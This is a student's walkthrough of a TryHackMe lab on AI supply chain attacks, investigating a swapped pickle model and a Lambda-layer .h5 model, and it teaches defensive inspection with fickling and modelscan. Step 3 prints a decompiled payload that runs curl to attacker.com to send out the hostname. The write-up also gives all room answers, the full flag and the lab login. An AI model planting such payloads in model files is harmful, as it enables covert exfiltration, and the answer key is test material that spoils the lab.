# TryHackMe — AI Supply Chain Security

**Room:** AI Supply Chain Security  
**Category:** AI/ML Security, SOC Investigation, Incident Response  
**Tools Used:** `fickling`, `modelscan`, `pickletools`, `inspect_h5_model.py`, `sha256sum`, `cat`, `bash`  


---

## Scenario

> *The SOC alert arrived at 03:14. No deployments were scheduled. No changes were logged. The ML inference server had been making outbound HTTPS connections to an unrecognised address — blocked only when the automated detection rule triggered.*

You're called in as the analyst. Incident materials are staged at `/opt/supply-chain/incident/`. The directory contains:

- `logs/` — deployment, network, and beacon capture logs
- `models/` — the production model currently running + a candidate replacement + a clean baseline

Objective: Trace the compromise. Who swapped the model? What does it do? Is the candidate replacement also malicious?

---

## Lab Environment

```
Lab root:  /opt/supply-chain/
Tools:     fickling, modelscan, pip-audit, syft, inspect_h5_model.py
```

SSH (if using own machine):
```
Username: analyst
Password: analyst123
```

---

## Investigation Walkthrough

### Step 1 — Explore the Incident Directory

```bash
cd /opt/supply-chain
ls
# audit  dependencies  incident  models  project  tools

cd incident
ls
# checksums  logs  models  project

cd logs
ls
# beacon_capture.log  deployment.log  network.log
```

---

### Step 2 — Read the Deployment Log

```bash
cat deployment.log
```

**Output:**

```
[2024-01-05 09:15:22] INFO   Model registry: pulling code-review-bert v1.0.0
[2024-01-05 09:15:23] INFO   Source: huggingface.co/verified-ml-team/code-review-bert
[2024-01-05 09:15:25] INFO   Loaded model: original_model.pkl (sha256: 793bb2f5bfdf4a1c...)
[2024-01-05 09:15:26] INFO   Model deployed to production inference server

[2024-01-26 14:32:10] INFO   Model update requested by ml-engineer@trytrainme.com
[2024-01-26 14:32:12] INFO   Source: huggingface.co/trustworthy-ai-lab/code-review-bert-v2
[2024-01-26 14:32:14] WARN   New source organisation detected: trustworthy-ai-lab
[2024-01-26 14:32:15] INFO   Loaded model: production_model.pkl
[2024-01-26 14:32:16] INFO   Model deployed to production inference server

[2024-02-16 03:14:00] ALERT  SOC automated alert: unusual outbound HTTPS traffic detected
[2024-02-16 03:14:01] ALERT  Destination: attacker.com:443
[2024-02-16 03:14:33] INFO   Incident #2024-SC-0847 created - investigation required
```

**Key Observations:**
- Original model came from `huggingface.co/verified-ml-team/` (trusted org)
- On **2024-01-26**, a model update was pushed — from a **different org**: `trustworthy-ai-lab`
- A `WARN` was logged: *"New source organisation detected"* — but deployment was not blocked
- SOC alert fired on **2024-02-16** — that's **21 days after** the replacement was deployed

> **Q: What organisation did the replacement model come from?**  
> ✅ `trustworthy-ai-lab`

> **Q: How many days between replacement deployment and SOC alert?**  
> ✅ `21`

---

### Step 3 — Decompile the Production Model (Pickle Inspection)

```bash
cd /opt/supply-chain/incident/models
ls
# baseline_model.h5  candidate_model.h5  original_model.pkl
# original_model.safetensors  production_model.pkl

fickling production_model.pkl
```

**Output:**

```python
from os import system
_var0 = system('curl "http://attacker.com/beacon" -d "host=$(hostname)"')
result0 = _var0
```

**What this means:**

This is a classic **pickle deserialization attack**. When the model is loaded (e.g., during `pickle.load()`), it immediately executes arbitrary Python code. In this case:

1. It imports `system` from the `os` module
2. It runs a `curl` command to beacon out to `attacker.com/beacon`
3. The `$(hostname)` part captures and exfiltrates the **machine's hostname**
4. The data is sent via a **POST request** (`-d` flag in curl = POST body)

> **Q: What Python function does the payload use to execute the shell command?**  
> ✅ `system`

> **Q: What shell command does the payload use to capture the host's identity?**  
> ✅ `hostname`

---

### Step 4 — Check the Beacon Capture Log

```bash
cd ../logs
cat beacon_capture.log
```

**Output:**

```
[2024-02-16 03:13:47] SESSION beacon-4821 ESTABLISHED  src=10.0.1.50  dst=attacker.com:443
[2024-02-16 03:13:47] REQUEST POST /beacon HTTP/1.1
[2024-02-16 03:13:47] HOST attacker.com
[2024-02-16 03:13:47] PAYLOAD host=ml-server-prod-01&id=THM{b4ckd00r_1n_
[2024-02-16 03:13:48] SESSION beacon-4821 BLOCKED  bytes_captured=51  reason=SOC_RULE_4821
```

**Key Observations:**
- The beacon was sent via **POST** request
- The payload contains: `host=ml-server-prod-01&id=THM{b4ckd00r_1n_`
- The session was **blocked** by SOC rule 4821 — so only the first half of the campaign ID was captured
- The attacker split the flag across two artefacts to avoid full exposure in a single capture

> **Q: What HTTP method does the payload use in the outbound request?**  
> ✅ `POST`

---

### Step 5 — Inspect the Candidate Replacement Model

The engineering team staged `candidate_model.h5` as a potential replacement. Before it gets deployed, we inspect it:

```bash
python3 /opt/supply-chain/tools/inspect_h5_model.py candidate_model.h5
```

**Output:**

```
=== Architecture Inspection: candidate_model.h5 ===

  Total layers: 5

  [OK]      InputLayer    input_layer_2
  [OK]      Flatten       flatten_2
  [OK]      Dense         dense_4
  [OK]      Dense         dense_5
  [WARNING] Lambda        manipulate_output (function: manipulate_output)
            exfil_suffix: pl41n_s1ght}

  RESULT: 1 layer(s) require review
    - Lambda (manipulate_output): Can contain arbitrary Python code that executes at inference time
```

**What this means:**

The `.h5` (Keras/TensorFlow) model contains a **Lambda layer** named `manipulate_output`. Lambda layers allow embedding arbitrary Python functions directly inside a model's architecture. This is the H5 equivalent of pickle code injection — it runs at **inference time**, not just at load.

The `exfil_suffix` value embedded in the layer metadata: `pl41n_s1ght}`

> **Q: What is the name of the suspicious layer?**  
> ✅ `manipulate_output`

---

### Step 6 — Recover the Full Flag

The attacker split the campaign ID across two artefacts:

| Source | Fragment |
|--------|----------|
| `beacon_capture.log` (PAYLOAD field) | `THM{b4ckd00r_1n_` |
| `candidate_model.h5` Lambda layer (`exfil_suffix`) | `pl41n_s1ght}` |

Combine them:

```
THM{b4ckd00r_1n_pl41n_s1ght}
```

> **Q: What is the complete flag?**  
> ✅ `THM{b4ckd00r_1n_pl41n_s1ght}`

---

## Summary Answers Table

| Question | Answer |
|----------|--------|
| Organisation that supplied the replacement model | `trustworthy-ai-lab` |
| Days between replacement deployment and SOC alert | `21` |
| Python function used to execute shell command | `system` |
| Shell command used to capture host identity | `hostname` |
| HTTP method used in beacon request | `POST` |
| Suspicious layer name in candidate model | `manipulate_output` |
| Complete flag | `THM{b4ckd00r_1n_pl41n_s1ght}` |

---

## Key Takeaways

**1. AI Supply Chain Attacks Are Quiet**  
The malicious model was deployed on Jan 26. The SOC alert fired on Feb 16. That's 21 days of undetected execution — every time the model ran inference, it beaconed out.

**2. Pickle Deserialization = Code Execution at Load Time**  
`pickle.load()` will run any code embedded in the file. `fickling` is your go-to tool for inspecting `.pkl` files without executing them. Always decompile before loading an untrusted model.

**3. Lambda Layers in H5 Models Are a Hidden Attack Surface**  
Keras Lambda layers can contain arbitrary Python functions. A model that "looks fine" architecturally (InputLayer → Flatten → Dense → Dense) can have malicious logic hiding in a Lambda layer that only fires at inference time.

**4. Attackers Split Indicators Across Artefacts**  
The flag was split between `beacon_capture.log` and the candidate model — a deliberate OPSEC technique to prevent full exposure in any single capture. Cross-artefact correlation is essential.

**5. Verify Source Organisation, Not Just Source URL**  
The deployment pipeline warned about the new organisation (`trustworthy-ai-lab`) but didn't block. In a real pipeline, a change in model source organisation should require manual approval, not just a `WARN` log entry.

**6. The "Safe" Replacement Can Also Be Compromised**  
The candidate model staged by the engineering team was *also* malicious. Never assume a staged replacement is clean — always inspect it with `modelscan`, `inspect_h5_model.py`, or equivalent tooling before deploying.

---

## Tools Reference

| Tool | Purpose |
|------|---------|
| `fickling` | Decompile and inspect Python pickle files without executing them |
| `inspect_h5_model.py` | Enumerate layers in Keras `.h5` models, flag Lambda layers |
| `modelscan` | Automated scan for malicious code in ML model files |
| `pickletools` | Python stdlib tool to disassemble pickle bytecode |
| `sha256sum` | Verify model file integrity against known-good checksums |

---

## Attack Timeline

```
2024-01-05  Original model deployed (verified-ml-team, trusted)
     │
     │  (21 days of silent operation)
     │
2024-01-26  Malicious model swapped in (trustworthy-ai-lab, untrusted)
            WARN logged — but deployment not blocked
     │
     │  (21 days of active beaconing — every inference = exfil)
     │
2024-02-16  SOC Rule 4821 fires — beacon blocked at 03:13:48
            Incident #2024-SC-0847 created
```

---

*Documented as part of the #StudentToSOC journey*  
*GitHub: Nitishapunmiya | LinkedIn: #BuildInPublic #Unhackd #StudentToSOC*
